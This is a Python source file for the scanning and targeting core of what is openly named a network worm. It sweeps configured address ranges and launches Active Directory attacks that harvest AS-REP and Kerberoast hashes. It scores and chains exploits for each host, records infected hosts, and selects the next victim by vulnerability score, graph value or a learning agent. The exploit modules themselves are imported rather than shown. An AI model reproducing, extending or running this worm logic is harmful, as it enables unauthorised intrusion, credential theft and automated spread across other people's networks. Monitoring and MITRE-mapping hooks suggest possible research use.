import asyncio
import os
from datetime import datetime
from typing import Dict, List, Optional

from .module_imports import (
    CLIMonitor,
    HostClassifier,
    WormActivityBridge,
    logger,
)
from .standalone import get_local_ip


class WormCoreScanning:
    def scan_network(self, use_professional: bool = True) -> List[Dict]:
        logger.info("Starting network reconnaissance")

        if self.activity_bridge:
            self.activity_bridge.on_scan_start(self.config.network.target_ranges)

        self.stats["scans"] += 1

        if use_professional and self.pro_scanner:
            logger.info("Using Professional Scanner")
            loop = asyncio.new_event_loop()

            def update_progress(scanned, total, found):
                pct = (scanned / max(total, 1)) * 100
                bar_len = 20
                filled = int(bar_len * scanned // max(total, 1))
                bar = "\u2588" * filled + "\u2591" * (bar_len - filled)
                self.stats["scan_progress"] = f"[{bar}] {pct:.1f}% ({scanned}/{total})"

            try:
                results = loop.run_until_complete(
                    self.pro_scanner.scan_network(
                        self.config.network.target_ranges,
                        categories=[
                            "essential",
                            "windows",
                            "linux",
                            "database",
                            "web",
                            "remote",
                        ],
                        progress_callback=(
                            update_progress if getattr(self, "cli_monitor", None) else None
                        ),
                        show_progress=not getattr(self, "cli_monitor", None),
                    )
                )
            finally:
                loop.close()

            if not results and self.enterprise_scanner:
                logger.info("Pro scanner returned 0 hosts -- falling back to Enterprise TCP Scanner")
                results = []
                for cidr in self.config.network.target_ranges:
                    found = self.enterprise_scanner.scan_range(cidr)
                    results.extend(found)
        elif self.enterprise_scanner:
            logger.info("Using Enterprise TCP Scanner v2")
            results = []
            for cidr in self.config.network.target_ranges:
                found = self.enterprise_scanner.scan_range(
                    cidr,
                    callback=lambda h: (
                        self.cli_monitor.log_event(
                            "scan",
                            f"Host found: {h['hostname']} ({h['asset_type']}) val={h['asset_value']}",
                            h["ip"],
                            h,
                        )
                        if self.cli_monitor
                        else None
                    ),
                )
                results.extend(found)
            results.sort(key=lambda h: h.get("asset_value", 0), reverse=True)
        else:
            results = self.scanner.scan_network(self.config.network.target_ranges)

        self.scan_results = results
        self.stats["total_hosts_discovered"] = len(results)

        if self.host_classifier:
            for host in results:
                try:
                    host_type = self.host_classifier.classify(host)
                    host["host_type"] = host_type
                    vuln_score = self.host_classifier.predict_vulnerability(host)
                    host["ml_vulnerability_score"] = vuln_score
                except Exception:
                    host["host_type"] = "unknown"

        if self.ad_attacker and results:
            try:
                ad_report = self.ad_attacker.attack(
                    scan_results=results,
                    domain=getattr(self.config, "domain", None),
                    credentials=("", ""),
                )
                if ad_report.get("dcs_found"):
                    logger.success(
                        f"AD Attack: {len(ad_report['dcs_found'])} DC(s) found, "
                        f"{len(ad_report.get('asrep_hashes', []))} AS-REP hashes, "
                        f"{len(ad_report.get('kerberoast_hashes', []))} Kerberoast hashes"
                    )
                    self.stats["ad_hashes_captured"] = ad_report.get("total_hashes", 0)
                    if self.cli_monitor:
                        self.cli_monitor.log_event(
                            "exploit",
                            f"AD: {ad_report['total_hashes']} hashes captured from DC",
                            ad_report["dcs_found"][0],
                            ad_report,
                        )
            except Exception as e:
                logger.warning(f"AD attack failed: {e}")

        if self.knowledge_graph:
            for host in results:
                ip = host.get("ip", "")
                self.knowledge_graph.add_host(
                    ip,
                    os_guess=host.get("os_guess", "Unknown"),
                    ports=host.get("open_ports", []),
                    is_infected=ip in self.infected_hosts,
                    is_high_value=host.get("vulnerability_score", 0) > 70,
                    subnet=host.get("subnet", ""),
                )

                services = host.get("services", {})
                if isinstance(services, dict):
                    for port_str, svc_name in services.items():
                        try:
                            port = int(port_str)
                        except (ValueError, TypeError):
                            continue
                        self.knowledge_graph.add_service(ip, port, svc_name)

                for infected_ip in self.infected_hosts:
                    self.knowledge_graph.add_reachability(infected_ip, ip)

        if self.vuln_scanner and results:
            for host in results:
                vulns = self.vuln_scanner.scan_target(host)
                if vulns:
                    host["vulnerabilities"] = vulns
                    self.stats["vulnerabilities_found"] += len(vulns)

                    if self.exploit_chain:
                        chain = self.exploit_chain.build_chain(host)
                        if chain:
                            host["exploit_chain"] = chain
                            self.stats["exploit_chains_built"] += 1

        if self.activity_bridge:
            for host in results:
                self.activity_bridge.on_host_discovered(
                    host["ip"],
                    host.get("open_ports", []),
                    host.get("os_guess", "Unknown"),
                )

        logger.success(
            f"Discovered {len(results)} hosts, {self.stats['vulnerabilities_found']} vulnerabilities"
        )

        if self.mitre_mapper:
            try:
                self.mitre_mapper.record(
                    wormy_technique="discovery",
                    target=",".join(h["ip"] for h in results[:5]),
                    success=True,
                    details={
                        "hosts_found": len(results),
                        "vulns": self.stats["vulnerabilities_found"],
                    },
                )
            except Exception:
                pass

        self.real_world_agent.update_state(results, self.infected_hosts)
        return results

    def select_next_target(self) -> Optional[Dict]:
        logger.info("Selecting next target")

        self.real_world_agent.update_state(self.scan_results, self.infected_hosts)

        if self.knowledge_graph:
            high_value = self.knowledge_graph.get_high_value_targets()
            if high_value:
                for hv_ip in high_value:
                    for host in self.scan_results:
                        if host["ip"] == hv_ip and hv_ip not in self.infected_hosts:
                            logger.info(f"Knowledge Graph: prioritizing high-value target {hv_ip}")
                            if self.activity_bridge:
                                self.activity_bridge.on_ml_decision(hv_ip, 0.9)
                            return host

        if self.scan_results:
            best_vuln_target = None
            best_vuln_score = 0
            for host in self.scan_results:
                if host["ip"] in self.infected_hosts or host["ip"] in self.failed_targets:
                    continue
                vulns = host.get("vulnerabilities", [])
                if vulns:
                    max_cvss = max(v.get("cvss", 0) for v in vulns)
                    if max_cvss > best_vuln_score:
                        best_vuln_score = max_cvss
                        best_vuln_target = host

            if best_vuln_target and best_vuln_score >= 9.0:
                logger.info(
                    f"Vulnerability Scanner: prioritizing {best_vuln_target['ip']} (CVSS: {best_vuln_score})"
                )
                return best_vuln_target

        target = self.real_world_agent.select_next_target(
            use_thompson=getattr(self, "use_thompson_sampling", False)
        )

        if target:
            logger.log_ml_decision(
                "RL_Agent",
                f"Target: {target['ip']}",
                target.get("confidence", 0.5),
                {
                    "ip": target["ip"],
                    "priority": target.get("priority", 0),
                    "vuln_score": target.get("vulnerability_score", 0),
                },
            )
            if self.activity_bridge:
                self.activity_bridge.on_ml_decision(target["ip"], target.get("confidence", 0.5))

        return target
